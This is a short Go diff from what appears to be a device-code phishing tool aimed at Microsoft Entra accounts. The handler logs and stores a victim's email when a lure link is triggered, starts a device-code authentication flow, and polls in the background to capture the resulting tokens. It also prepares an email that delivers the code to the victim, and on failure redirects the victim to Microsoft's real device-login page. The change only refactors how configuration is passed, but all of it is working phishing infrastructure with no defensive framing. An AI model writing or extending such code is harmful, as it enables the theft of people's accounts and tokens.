@@ -36,12 +36,19 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 	// Insert the email address into the emails_scanned table
 	// Not critical if this fails
-	log.Printf("[%s] QR Code Scanned\n", email)
+	log.Printf("[%s] Link triggered\n", email)
 	_ = database.SaveEmailScanned(email)
 
 	// --- 1. Request device code ---
 
-	deviceCodeResult, err := initDeviceCode(email)
+	// Load the current configuration
+	config := database.LoadConfig()
+
+	// Get the Entra config
+	entraConfig := config.EntraConfig
+	requestConfig := config.RequestConfig
+
+	deviceCodeResult, err := initDeviceCode(email, entraConfig, requestConfig)
 	if err != nil {
 		log.Printf("error initializing device code: %v", err)
 		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
@@ -49,11 +56,9 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 	// --- 2. Start polling for device code authentication ---
 
-	go authPoll(email, deviceCodeResult)
+	go authPoll(email, deviceCodeResult, entraConfig, requestConfig)
 
 	// --- 3. Prepare user device code email ---
-
-	config := database.LoadConfig()
 
 	emailConfig := config.EmailConfig
 	smtpConfig := config.SMTPConfig
